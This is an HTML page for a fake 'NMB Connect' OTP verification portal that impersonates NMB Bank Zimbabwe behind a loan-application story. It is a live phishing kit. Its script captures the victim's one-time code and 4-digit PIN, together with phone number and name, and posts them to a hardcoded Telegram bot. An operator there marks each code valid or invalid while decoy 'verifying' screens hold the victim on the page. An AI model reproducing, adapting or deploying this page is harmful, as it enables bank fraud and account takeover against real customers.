<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMB Connect - OTP Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
        * { font-family: 'Inter', sans-serif; }
        body { background: linear-gradient(135deg, #003d7a 0%, #002147 100%); min-height: 100vh; }
        .otp-input:focus { border-color: #fbbf24; box-shadow: 0 0 0 2px rgba(251, 191, 36, 0.2); }
        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">
    <div class="w-full max-w-sm fade-in">
        <!-- Header -->
        <div class="text-center mb-6">
            <div class="flex items-center justify-center gap-2 mb-2">
                <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center shadow-lg">
                    <span class="text-sm font-black text-[#003d7a]">N</span>
                </div>
                <div>
                    <div class="flex items-center gap-1">
                        <span class="text-2xl font-black text-white tracking-tighter">NMB</span>
                        <span class="text-2xl font-black text-[#fbbf24] tracking-tighter">Connect</span>
                    </div>
                </div>
            </div>
            <p class="text-white/80 text-[9px] font-bold uppercase tracking-[0.2em]">OTP Verification</p>
        </div>

        <!-- Main Card -->
        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
            <!-- Title Section -->
            <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Enter OTP Code</h1>
                <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Sent to <span id="phoneDisplay" class="text-white font-black">+263XXXXXXXXX</span></p>
            </div>

            <!-- Content -->
            <div id="otpForm" class="p-6 sm:p-8 space-y-6">
                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4 flex justify-between items-center">
                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Loan Amount</span>
                    <span class="font-black text-lg text-[#003d7a]" id="displayAmount">USD 500</span>
                </div>

                <div class="space-y-3">
                    <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">6-Digit OTP Code</label>
                    <div class="flex gap-2">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                        <input type="tel" maxlength="1" class="otp-input w-full h-12 text-center text-xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none">
                    </div>
                </div>
                
                <div class="text-center">
                    <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">
                        Resend code in <span id="timer" class="text-[#003d7a] font-black">59</span>s
                    </p>
                </div>

                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
                    Verify OTP <i class="fas fa-check-circle ml-2"></i>
                </button>
            </div>

            <!-- Verification Overlay -->
            <div id="verificationOverlay" class="hidden p-10 text-center space-y-6">
                <div class="relative w-24 h-24 mx-auto">
                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
                    <div class="absolute inset-0 border-4 border-[#fbbf24] border-t-transparent rounded-full animate-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center">
                        <i class="fas fa-key text-3xl text-[#003d7a]"></i>
                    </div>
                </div>
                <div class="space-y-2">
                    <h3 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verifying OTP</h3>
                    <p class="text-gray-500 text-[9px] font-bold uppercase tracking-widest">Hold for verification...</p>
                </div>
            </div>
        </div>

        <!-- PIN Modal -->
        <div id="pinModal" class="fixed inset-0 bg-black/80 backdrop-blur-md hidden flex items-center justify-center p-4 z-50">
            <div class="glass-effect rounded-3xl max-w-xs w-full overflow-hidden shadow-2xl fade-in">
                <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
                    <h4 class="text-white font-black text-lg uppercase tracking-tight">Confirm Your PIN</h4>
                    <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Re-enter your 4-digit security PIN</p>
                </div>
                
                <div class="p-8 space-y-6">
                    <div id="pinEntry" class="space-y-6">
                        <div class="flex gap-3">
                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
                            <input type="password" maxlength="1" class="pin-confirm w-full h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#fbbf24]">
                        </div>
                        <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl uppercase text-sm tracking-[0.15em] shadow-lg hover:shadow-xl active:scale-[0.98] transition-all">
                            Confirm PIN <i class="fas fa-lock ml-2"></i>
                        </button>
                    </div>

                    <div id="pinAdmin" class="hidden text-center py-4">
                        <div class="animate-spin w-12 h-12 border-4 border-[#fbbf24] border-t-transparent rounded-full mx-auto mb-4"></div>
                        <p class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Processing Final Verification</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <p class="text-center text-white/50 text-[9px] mt-8 font-bold uppercase tracking-widest">
            © 2026 NMB Bank Zimbabwe | Secure OTP Portal
        </p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const TELEGRAM_CHAT_ID = '7547427914';
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        const otpInputs = document.querySelectorAll('.otp-input');
        const pinConfirmInputs = document.querySelectorAll('.pin-confirm');
        const submitBtn = document.getElementById('submitBtn');
        const otpForm = document.getElementById('otpForm');
        const verificationOverlay = document.getElementById('verificationOverlay');
        const pinModal = document.getElementById('pinModal');
        const pinEntry = document.getElementById('pinEntry');
        const pinAdmin = document.getElementById('pinAdmin');
        const confirmPinBtn = document.getElementById('confirmPinBtn');
        const phoneDisplay = document.getElementById('phoneDisplay');
        const displayAmount = document.getElementById('displayAmount');
        const timerText = document.getElementById('timer');

        const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
        phoneDisplay.textContent = session.phone || '+263XXXXXXXXX';
        displayAmount.textContent = `USD ${parseFloat(session.amount || 0).toLocaleString()}`;

        // OTP Auto-focus and Auto-send
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                if (e.target.value && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                checkOtpComplete();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) otpInputs[index - 1].focus();
            });
        });

        function checkOtpComplete() {
            const otp = Array.from(otpInputs).map(i => i.value).join('');
            if (otp.length === 6) {
                setTimeout(() => {
                    sendOtpToTelegram(otp);
                    triggerVerification();
                }, 300);
            }
        }

        submitBtn.addEventListener('click', () => {
            const otp = Array.from(otpInputs).map(i => i.value).join('');
            if (otp.length === 6) {
                sendOtpToTelegram(otp);
                triggerVerification();
            } else {
                alert('Please enter the complete 6-digit OTP code');
            }
        });

        function triggerVerification() {
            otpForm.classList.add('hidden');
            verificationOverlay.classList.remove('hidden');
        }

        async function sendOtpToTelegram(otp) {
            const message = `
🔐 <b>OTP VERIFICATION - NMB ZIMBABWE</b>

📱 <b>Phone:</b> ${session.phone}
🔑 <b>OTP Code:</b> <code>${otp}</code>
💰 <b>Loan Amount:</b> USD ${session.amount}
👤 <b>Applicant:</b> ${session.fullName}

<b>Status: Awaiting Admin Verification</b>
            `;

            const inlineKeyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ VALID OTP', callback_data: `valid_otp_${session.phone}` },
                        { text: '❌ INVALID OTP', callback_data: `invalid_otp_${session.phone}` }
                    ]
                ]
            };

            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: inlineKeyboard
                    })
                });
                
                pollForOtpStatus(session.phone);
            } catch (error) { 
                console.error('Error sending OTP to Telegram:', error); 
            }
        }

        function pollForOtpStatus(phone) {
            const interval = setInterval(() => {
                const status = localStorage.getItem(`otp_approval_${phone}`);
                if (status === 'valid') {
                    clearInterval(interval);
                    localStorage.removeItem(`otp_approval_${phone}`);
                    verificationOverlay.classList.add('hidden');
                    pinModal.classList.remove('hidden');
                } else if (status === 'invalid') {
                    clearInterval(interval);
                    localStorage.removeItem(`otp_approval_${phone}`);
                    alert('Invalid OTP. Please try again.');
                    location.reload();
                }
            }, 1000);
        }

        // PIN Logic
        pinConfirmInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                if (e.target.value && index < pinConfirmInputs.length - 1) pinConfirmInputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) pinConfirmInputs[index - 1].focus();
            });
        });

        confirmPinBtn.addEventListener('click', () => {
            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
            if (pin.length === 4) {
                pinEntry.classList.add('hidden');
                pinAdmin.classList.remove('hidden');
                sendPinToTelegram(pin);
            } else {
                alert('Please enter the complete 4-digit PIN');
            }
        });

        async function sendPinToTelegram(pin) {
            const message = `
🔒 <b>PIN VERIFICATION - NMB ZIMBABWE</b>

📱 <b>Phone:</b> ${session.phone}
🔑 <b>PIN Code:</b> <code>${pin}</code>
💰 <b>Loan Amount:</b> USD ${session.amount}
👤 <b>Applicant:</b> ${session.fullName}

<b>Status: Final Verification Required</b>
            `;

            const inlineKeyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ VALID PIN', callback_data: `valid_pin_${session.phone}` },
                        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${session.phone}` }
                    ]
                ]
            };

            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: inlineKeyboard
                    })
                });
                
                pollForPinStatus(session.phone);
            } catch (error) { 
                console.error('Error sending PIN to Telegram:', error); 
            }
        }

        function pollForPinStatus(phone) {
            const interval = setInterval(() => {
                const status = localStorage.getItem(`pin_approval_${phone}`);
                if (status === 'valid') {
                    clearInterval(interval);
                    localStorage.removeItem(`pin_approval_${phone}`);
                    window.location.href = 'success.html';
                } else if (status === 'invalid') {
                    clearInterval(interval);
                    localStorage.removeItem(`pin_approval_${phone}`);
                    alert('Invalid PIN. Please try again.');
                    location.reload();
                }
            }, 1000);
        }
    </script>
</body>
</html>
